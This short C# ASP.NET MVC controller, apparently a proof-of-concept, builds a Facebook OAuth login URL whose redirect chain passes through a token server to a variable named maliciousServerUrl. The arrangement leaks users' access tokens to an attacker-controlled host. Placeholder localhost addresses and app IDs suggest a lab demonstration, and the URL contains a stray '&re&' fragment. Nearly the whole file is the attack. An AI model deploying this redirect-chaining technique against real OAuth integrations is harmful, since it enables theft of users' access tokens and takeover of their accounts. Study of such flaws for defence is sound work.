using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace TokenSite.Controllers
{
    public class LoginController : Controller
    {
        // GET: Login
        public ActionResult Index()
        {
            string tokenServerUrl = "http://localhost:5344"; // configure for yourself environment.
            string maliciousServerUrl = "http://localhost:5352"; // configure for yourself environment.
            string key = "[YOUR_FB_APP_ID]"; // configure for yourself environment.
            string scope = "[SCOPE]"; // configure for yourself environment.
            string redirectUrl = HttpUtility.UrlEncode(
                string.Format("{0}/Home?redirectUrl={1}", tokenServerUrl,
                HttpUtility.UrlEncode(string.Format("{0}/Home", maliciousServerUrl))));

            return Redirect(string.Format(
                "https://www.facebook.com/dialog/oauth?client_id={0}&redirect_uri={1}&re&response_type=code%20token&scope={2}",
                key, redirectUrl, scope));
        }
    }
}